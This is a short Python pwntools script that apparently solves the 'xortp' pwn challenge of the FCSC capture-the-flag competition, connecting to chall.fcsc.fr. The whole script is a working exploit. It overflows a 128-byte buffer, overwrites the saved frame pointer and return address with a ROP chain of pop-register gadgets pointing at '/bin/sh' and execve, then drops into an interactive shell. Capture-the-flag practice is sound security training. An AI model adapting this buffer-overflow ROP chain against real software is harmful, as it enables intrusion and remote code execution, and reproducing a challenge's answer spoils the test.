
from pwn import *

context.log_level = "debug"

# io = process("./xortp")
io = remote("chall.fcsc.fr", 2105)
# io = process(["gdbserver", "localhost:3333", "./xortp"])

# gadgets
execve = 0x47B1C0
system = 0x40A3C0
pop_rdi_ret = 0x401f60
pop_rsi_ret = 0x40f972
pop_rdx_pop_rbx_ret = 0x4867a7
bin_sh = 0x498213

pld  = b"A"*128
pld += b"B"*8
pld += b"C"*8 
pld += b"D"*8 # rewrite rbp
pld += p64(pop_rdi_ret)
pld += p64(bin_sh) 
pld += p64(pop_rsi_ret) 
pld += p64(0x0) 
pld += p64(pop_rdx_pop_rbx_ret) 
pld += p64(0x0) 
pld += p64(0x0) 
pld += p64(execve) 

io.recvuntil(b"encrypt?\n")
io.sendline(pld)

io.interactive()
